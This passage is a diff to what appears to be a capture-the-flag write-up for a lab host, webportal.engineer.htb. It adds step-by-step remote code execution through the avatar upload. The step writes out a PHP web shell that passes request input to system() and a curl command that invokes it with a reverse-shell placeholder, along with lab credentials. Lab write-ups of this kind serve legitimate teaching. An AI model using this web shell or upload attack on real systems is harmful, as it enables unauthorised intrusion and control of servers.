@@ -190,5 +190,26 @@ grab the session cookie: PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp
 
 6. rce via uploading avatar
 
-*refer to https://www.idappcom.co.uk/post/engineers-online-portal-1-0-remote-code-execution
-/teacher_avatar.php
+*refer to https://www.exploit-db.com/exploits/50444
+
+*login with one of the teacher creds (e.g tom:tomandjerry)
+
+*change the avatar by clicking the "change avatar" option as shown:
+
+<img src=img/avatar.png>
+
+*create a vuln.php file with the following content:
+
+            <?php
+            if($_REQUEST['x']) {
+              system($_REQUEST['x']);
+              } else phpinfo();
+            ?>
+
+*upload vuln.php file as the avatar
+
+*the file is stored in /admin/uploads. Get rce via:
+
+            $curl http://webportal.engineer.htb/admin/uploads/vuln.php?x={ur bash reverse shell here}
+            
+7. 
